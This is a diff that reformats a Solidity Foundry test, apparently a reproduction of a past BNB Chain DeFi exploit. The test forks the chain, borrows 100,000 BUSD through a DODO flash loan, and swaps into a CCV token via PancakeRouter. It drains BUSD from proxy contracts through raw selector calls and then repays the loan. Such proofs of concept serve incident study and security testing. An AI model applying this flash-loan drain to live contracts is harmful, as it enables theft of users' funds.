@@ -27,9 +27,8 @@ contract ContractTest is Test {
     IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     IDPPAdvanced DODO = IDPPAdvanced(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
 
-
     function setUp() public {
-        vm.createSelectFork("bsc", 34739874 - 1);
+        vm.createSelectFork("bsc", 34_739_874 - 1);
         vm.label(address(proxy3717), "proxy3717");
         vm.label(address(proxye38d), "proxye38d");
     }
@@ -39,7 +38,7 @@ contract ContractTest is Test {
         emit log_named_uint("Attacker BUSD balance before attack:", BUSD.balanceOf(address(this)));
         CCV.approve(address(Router), type(uint256).max);
         BUSD.approve(address(Router), type(uint256).max);
-        DODO.flashLoan(0, 100000 * 1e18, address(this), new bytes(1));
+        DODO.flashLoan(0, 100_000 * 1e18, address(this), new bytes(1));
         emit log_named_uint("Attacker BUSD balance before attack:", BUSD.balanceOf(address(this)));
     }
 
@@ -51,8 +50,8 @@ contract ContractTest is Test {
         (bool success2,) =
             address(proxye38d).call(abi.encodeWithSelector(bytes4(0xb7da6a49), BUSD.balanceOf(address(proxye38d))));
         TOKENTOBUSD();
-        
-        BUSD.transfer(address(DODO), 100000 * 1e18);
+
+        BUSD.transfer(address(DODO), 100_000 * 1e18);
     }
 
     function BUSDTOTOKEN() internal {
@@ -60,7 +59,7 @@ contract ContractTest is Test {
         path[0] = address(BUSD);
         path[1] = address(CCV);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            100000 * 1e18, 0, path, address(this), block.timestamp
+            100_000 * 1e18, 0, path, address(this), block.timestamp
         );
     }
 
